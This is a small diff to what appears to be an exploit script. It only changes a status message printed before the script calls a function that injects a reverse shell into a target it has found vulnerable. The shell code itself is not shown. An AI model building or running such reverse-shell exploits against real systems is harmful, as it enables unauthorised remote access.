@@ -19,7 +19,7 @@ print('[!] Checking if target is vulnerable [!]')
 
 if snapshots.check_vulnerable():
     print('[+] Target is vulnerable [+]')
-    print('[+] Sending payload [+]')
+    print('[!] Sending payload [!]')
 
     snapshots.inject_reverse_shell()
 
